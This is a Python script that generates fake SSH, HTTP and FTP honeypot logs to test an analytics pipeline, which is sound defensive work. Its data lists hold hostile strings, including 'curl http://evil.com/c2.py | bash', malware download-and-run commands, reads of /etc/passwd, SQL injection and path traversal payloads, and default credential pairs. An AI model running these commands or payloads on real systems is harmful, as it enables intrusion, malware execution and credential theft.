#!/usr/bin/env python3
"""
Test Log Generator
==================
Generates realistic fake honeypot logs so you can test
the full analytics pipeline without waiting for real attackers.

Run:
  python3 generate_test_logs.py
"""

import json
import os
import random
import string
from datetime import datetime, timezone, timedelta

LOG_DIR = "../logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ──────────────────────────────────────────────
# Data pools
# ──────────────────────────────────────────────
ATTACKER_IPS = [
    "192.168.1.100",  # Local tester
    "45.33.32.156",   # Nmap test host
    "198.20.99.130",  # Shodan scanner
    "91.219.29.100",  # Random bad IP
    "195.54.160.149", # Credential sprayer
    "5.188.206.26",   # Botnet node
    "103.242.93.1",   # Asia origin
    "79.124.62.130",  # EU origin
]

USERNAMES = ["root", "admin", "ubuntu", "pi", "user", "test", "oracle", "postgres",
             "mysql", "ftpuser", "www-data", "deploy", "ec2-user", "centos"]

PASSWORDS = ["password", "123456", "admin", "root", "toor", "Pass1234",
             "letmein", "qwerty", "welcome", "test123", "admin123", "P@ssw0rd"]

SSH_COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la",
    "wget http://evil.com/malware.sh", "curl http://evil.com/c2.py | bash",
    "chmod +x malware.sh && ./malware.sh",
    "cat /root/.ssh/authorized_keys", "history",
]

HTTP_PATHS_BENIGN = ["/", "/index.html", "/robots.txt", "/favicon.ico"]
HTTP_PATHS_ATTACK = [
    "/admin", "/wp-admin/", "/phpmyadmin/", "/.env",
    "/?id=1' OR 1=1--",
    "/cmd.php?cmd=ls+-la",
    "/../../../etc/passwd",
    "/login?user=admin&pass=' OR '1'='1",
    "/upload.php",
    "/.git/config",
]

FTP_USERS  = ["anonymous", "ftp", "admin", "root", "backup"]
FTP_PASSES = ["anonymous", "", "ftp", "admin@", "backup"]


# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────
def rts(offset_minutes: float = 0) -> str:
    """Random timestamp within the last 24 hours, offset by minutes."""
    base = datetime.now(timezone.utc) - timedelta(hours=24)
    base += timedelta(minutes=offset_minutes + random.uniform(0, 5))
    return base.isoformat()


def rand_port() -> int:
    return random.randint(30000, 65535)


# ──────────────────────────────────────────────
# SSH Log Generator
# ──────────────────────────────────────────────
def generate_ssh_logs(n_attackers: int = 5, events_per: int = 30):
    events = []
    ips = random.sample(ATTACKER_IPS, min(n_attackers, len(ATTACKER_IPS)))

    for ip in ips:
        n = random.randint(events_per // 2, events_per * 2)
        offset = random.uniform(0, 1400)
        port = rand_port()

        events.append({
            "event_type": "connection", "protocol": "ssh",
            "src_ip": ip, "src_port": port,
            "timestamp": rts(offset),
        })

        for i in range(n):
            events.append({
                "event_type" : "auth_attempt",
                "protocol"   : "ssh",
                "src_ip"     : ip,
                "src_port"   : port,
                "username"   : random.choice(USERNAMES),
                "password"   : random.choice(PASSWORDS),
                "attempt_num": i + 1,
                "timestamp"  : rts(offset + i * 0.5),
            })

        # Some attackers get in (for realism) and run commands
        if random.random() < 0.3:
            for cmd in random.sample(SSH_COMMANDS, random.randint(1, 4)):
                events.append({
                    "event_type": "shell_command",
                    "protocol"  : "ssh",
                    "src_ip"    : ip,
                    "command"   : cmd,
                    "timestamp" : rts(offset + n + 5),
                })

        events.append({
            "event_type": "disconnect", "protocol": "ssh",
            "src_ip": ip, "timestamp": rts(offset + n + 10),
        })

    with open(f"{LOG_DIR}/ssh_honeypot.json", "w") as f:
        for ev in sorted(events, key=lambda e: e["timestamp"]):
            f.write(json.dumps(ev) + "\n")
    print(f"[+] Generated {len(events)} SSH events for {len(ips)} IPs")


# ──────────────────────────────────────────────
# HTTP Log Generator
# ──────────────────────────────────────────────
def generate_http_logs(n_attackers: int = 6, events_per: int = 40):
    events = []
    ips = random.choices(ATTACKER_IPS, k=n_attackers)

    threat_map = {
        "/?id=1' OR 1=1--"           : ["sql_injection"],
        "/cmd.php?cmd=ls+-la"         : ["command_injection"],
        "/../../../etc/passwd"        : ["path_traversal", "file_inclusion"],
        "/login?user=admin&pass=' OR '1'='1": ["sql_injection"],
        "/admin"                      : ["admin_probe"],
        "/wp-admin/"                  : ["admin_probe"],
        "/phpmyadmin/"                : ["admin_probe"],
        "/.env"                       : ["admin_probe"],
        "/.git/config"                : ["admin_probe"],
        "/upload.php"                 : ["unknown_probe"],
    }

    for ip in ips:
        n      = random.randint(events_per // 2, events_per * 2)
        offset = random.uniform(0, 1400)
        ua     = random.choice([
            "Mozilla/5.0 (compatible; Googlebot/2.1)",
            "sqlmap/1.6.12",
            "Nikto/2.1.6",
            "python-requests/2.28.0",
            "curl/7.68.0",
            "masscan/1.3",
        ])

        for i in range(n):
            if random.random() < 0.7:
                path = random.choice(HTTP_PATHS_ATTACK)
            else:
                path = random.choice(HTTP_PATHS_BENIGN)

            threats = threat_map.get(path, ["unknown_probe"])

            events.append({
                "event_type"  : "http_request",
                "protocol"    : "http",
                "method"      : random.choice(["GET", "GET", "GET", "POST"]),
                "path"        : path,
                "src_ip"      : ip,
                "src_port"    : rand_port(),
                "user_agent"  : ua,
                "threats"     : threats,
                "timestamp"   : rts(offset + i),
            })

    with open(f"{LOG_DIR}/http_honeypot.json", "w") as f:
        for ev in sorted(events, key=lambda e: e["timestamp"]):
            f.write(json.dumps(ev) + "\n")
    print(f"[+] Generated {len(events)} HTTP events")


# ──────────────────────────────────────────────
# FTP Log Generator
# ──────────────────────────────────────────────
def generate_ftp_logs(n_attackers: int = 3, events_per: int = 10):
    events = []
    ips = random.sample(ATTACKER_IPS, min(n_attackers, len(ATTACKER_IPS)))

    for ip in ips:
        offset = random.uniform(0, 1400)
        port   = rand_port()

        events.append({
            "event_type": "connection", "protocol": "ftp",
            "src_ip": ip, "src_port": port, "timestamp": rts(offset),
        })
        for i in range(random.randint(3, events_per)):
            events.append({
                "event_type": "auth_attempt", "protocol": "ftp",
                "src_ip": ip,
                "username": random.choice(FTP_USERS),
                "password": random.choice(FTP_PASSES),
                "timestamp": rts(offset + i),
            })

    with open(f"{LOG_DIR}/ftp_honeypot.json", "w") as f:
        for ev in sorted(events, key=lambda e: e["timestamp"]):
            f.write(json.dumps(ev) + "\n")
    print(f"[+] Generated FTP events for {len(ips)} IPs")


# ──────────────────────────────────────────────
# Run All
# ──────────────────────────────────────────────
if __name__ == "__main__":
    print("[*] Generating test honeypot logs...\n")
    generate_ssh_logs(n_attackers=5, events_per=30)
    generate_http_logs(n_attackers=6, events_per=40)
    generate_ftp_logs(n_attackers=3, events_per=10)
    print(f"\n[✓] All test logs written to {LOG_DIR}/")
    print("    Next: run  python3 analytics/analytics_engine.py")
